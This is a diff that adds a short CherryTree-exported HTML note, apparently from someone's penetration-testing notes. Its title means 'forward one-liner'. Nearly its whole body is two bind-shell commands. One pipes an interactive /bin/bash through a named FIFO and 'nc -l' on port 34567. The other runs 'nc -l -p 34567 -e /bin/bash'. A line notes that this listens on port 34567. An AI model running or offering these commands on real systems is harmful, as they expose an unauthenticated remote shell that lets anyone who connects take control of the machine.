@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>正向一句话</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>正向一句话</h1><br/>rm /tmp/tmp_fifo<br />mkfifo /tmp/tmp_fifo<br />cat /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc -l 34567 &gt; /tmp/tmp_fifo<br /><br /><br />监听34567端口<br /><br /><br />nc -l -p 34567 -e /bin/bash<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
